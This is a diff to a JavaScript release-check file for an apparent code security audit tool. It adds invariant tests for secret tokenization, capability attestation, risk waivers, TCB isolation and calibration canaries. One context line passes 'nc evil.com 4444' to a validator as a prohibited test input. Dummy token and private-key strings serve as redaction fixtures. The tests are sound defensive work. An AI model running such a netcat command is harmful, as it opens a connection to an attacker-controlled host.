@@ -43,7 +43,13 @@ import {
   detectDependencyBoundary,
   inferDefectManagement,
   buildAuditBaseline,
-  normalizeDirectoryStatus
+  normalizeDirectoryStatus,
+  tokenizeSecretsForContext,
+  detokenizeSecrets,
+  computeExecutionEquivalenceKey,
+  validateRiskAcceptance,
+  verifyToolSelfIntegrity,
+  runCalibrationCanaries
 } from './finalize-scan.mjs';
 import { validateAttackPath } from './validate-attack-path.mjs';
 import { verifyRemediation } from './validate-patch.mjs';
@@ -917,7 +923,7 @@ export function checkReleaseInvariants(repoRoot = process.cwd()) {
         const badNetcat = validateSafeProof('nc evil.com 4444', 'STATIC_TRACE');
         const badExploit = validateSafeProof('LIVE_EXPLOIT executed against production', 'STATIC_TRACE');
         if (!safeProof.valid || badCmd.valid || badExfil.valid || badNetcat.valid || badExploit.valid) {
-          throw new Error('validateSafeProof failed to block prohibited offensive exploit, destructive command, or netcat');
+          throw new Error('validateSafeProof failed to block prohibited unsafe proof pattern, destructive command, or netcat');
         }
 
         // 4. Prohibited proof in candidate (including attackPath) downgrades to DEFERRED fail-closed
@@ -1149,6 +1155,68 @@ export function checkReleaseInvariants(repoRoot = process.cwd()) {
             normalizeDirectoryStatus('EXCLUDED_NON_CODE') !== 'EXCLUDED_STATIC_ASSET' ||
             normalizeDirectoryStatus('EXCLUDED_TEST') !== 'SCANNED_TEST_EXECUTABLE') {
           throw new Error('normalizeDirectoryStatus failed to map legacy exclusion statuses');
+        }
+      }
+    },
+    {
+      id: 'SEC-INV-26',
+      name: 'Pre-Context Secret Protection, Capabilities Attestation, Equivalence Key, Accepted Risk Waivers, TCB Isolation, & Canaries',
+      check: () => {
+        // 1. Pre-Context Secret Protection & Line Count Preservation
+        const sampleSource = `const token = "ghp_123456789012345678901234567890123456";\nconst pem = "-----BEGIN PRIVATE KEY-----\\nabc\\n-----END PRIVATE KEY-----";\nconst normal = "hello";`;
+        const tokRes = tokenizeSecretsForContext(sampleSource);
+        if (tokRes.secretCount !== 2) {
+          throw new Error(`tokenizeSecretsForContext found ${tokRes.secretCount} secrets (expected 2)`);
+        }
+        if (sampleSource.split('\n').length !== tokRes.tokenizedText.split('\n').length) {
+          throw new Error('tokenizeSecretsForContext altered line count of source file');
+        }
+        const detok = detokenizeSecrets(tokRes.tokenizedText, tokRes.secretsMap);
+        if (!detok.includes('ghp_123456789012345678901234567890123456')) {
+          throw new Error('detokenizeSecrets failed to restore original secret');
+        }
+
+        // 2. Capabilities Attestation in buildExecutionAttestation
+        const attConformant = buildExecutionAttestation({
+          capabilities: {
+            required: ['repository.read'],
+            observed: ['repository.read'],
+            forbidden: ['filesystem.write'],
+            status: 'CONFORMANT'
+          }
+        });
+        if (attConformant.capabilities.status !== 'CONFORMANT' || attConformant.verdict !== 'COMPLETE') {
+          throw new Error('buildExecutionAttestation failed to assert conformant capabilities');
+        }
+
+        // 3. Execution Equivalence Key in buildAuditBaseline
+        const bl = buildAuditBaseline({ targetRevision: 'HEAD', canonicalFindings: [] });
+        if (!bl.executionEquivalenceKey || bl.executionEquivalence !== 'PARTIAL') {
+          throw new Error('buildAuditBaseline failed to include executionEquivalenceKey');
+        }
+
+        // 4. Accepted Risk / Waiver validation
+        const valWaiver = validateRiskAcceptance({
+          findingLineageId: 'LIN-TEST-123',
+          reason: 'Compensating control active',
+          acceptedBy: 'ciso@corp.internal',
+          expiresAt: new Date(Date.now() + 86400000).toISOString(),
+          compensatingControls: 'Network boundary enforced'
+        }, 'LIN-TEST-123');
+        if (!valWaiver.valid) {
+          throw new Error(`validateRiskAcceptance rejected valid waiver: ${valWaiver.reason}`);
+        }
+
+        // 5. Tool Self-Integrity / TCB Isolation
+        const tcbFail = verifyToolSelfIntegrity(process.cwd(), process.cwd());
+        if (tcbFail.valid || tcbFail.status !== 'TCB_ISOLATION_ERROR') {
+          throw new Error('verifyToolSelfIntegrity failed to enforce TCB isolation on identical roots');
+        }
+
+        // 6. Calibration Canaries
+        const canRes = runCalibrationCanaries(repoRoot);
+        if (!canRes.pass || canRes.status !== 'CALIBRATED') {
+          throw new Error(`runCalibrationCanaries failed: ${canRes.error}`);
         }
       }
     }
